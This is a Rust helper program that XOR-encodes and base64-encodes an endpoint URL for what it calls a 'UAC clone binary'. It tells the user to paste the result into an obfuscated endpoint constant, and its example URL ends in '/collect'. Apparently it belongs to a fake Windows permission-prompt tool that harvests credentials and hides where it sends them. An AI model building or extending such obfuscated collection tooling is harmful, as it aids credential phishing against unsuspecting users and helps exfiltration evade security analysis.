//! Utility to encode an arbitrary endpoint URL into the obfuscated format
//! used by the UAC clone binary.
//!
//! Usage:
//!   cargo run --bin encode_url "https://your-server.com/endpoint"

use base64::{engine::general_purpose::STANDARD as BASE64, Engine};

const XOR_KEY: &[u8] = b"UAC_SECURE_AUTH_KEY_2026_X9";

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        println!("UAC URL Obfuscator");
        println!("==================");
        println!("Usage: cargo run --bin encode_url <URL>");
        println!("Example: cargo run --bin encode_url \"https://api.myserver.com/collect\"");
        return;
    }

    let url = &args[1];
    let xored: Vec<u8> = url
        .bytes()
        .zip(XOR_KEY.iter().cycle())
        .map(|(b, k)| b ^ k)
        .collect();
    let encoded = BASE64.encode(xored);

    println!("\nPlaintext URL: {}", url);
    println!("Obfuscated String:\n{}", encoded);
    println!("\nTo use this URL, update OBFUSCATED_ENDPOINT_B64 in `src/obfuscate.rs` with the string above.");
}
